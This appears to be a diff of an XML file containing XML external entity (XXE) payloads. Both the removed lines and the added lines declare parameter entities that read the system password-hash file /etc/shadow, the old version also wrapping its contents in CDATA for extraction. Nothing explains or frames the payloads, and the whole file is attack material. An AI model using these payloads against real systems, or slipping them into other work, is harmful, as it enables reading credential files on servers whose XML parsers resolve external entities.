@@ -1,5 +1,6 @@
-<!ENTITY % file SYSTEM "file:///etc/shadow">
-<!ENTITY % start "<![CDATA[">
-<!ENTITY % end "]]>">
-<!ENTITY % all "<!ENTITY fileContents 
-'%start;%file;%end;'>">
+<!DOCTYPE root [
+    <!ENTITY % local_dtd SYSTEM "file:///etc/shadow">
+
+    %local_dtd;
+]>
+<root></root>
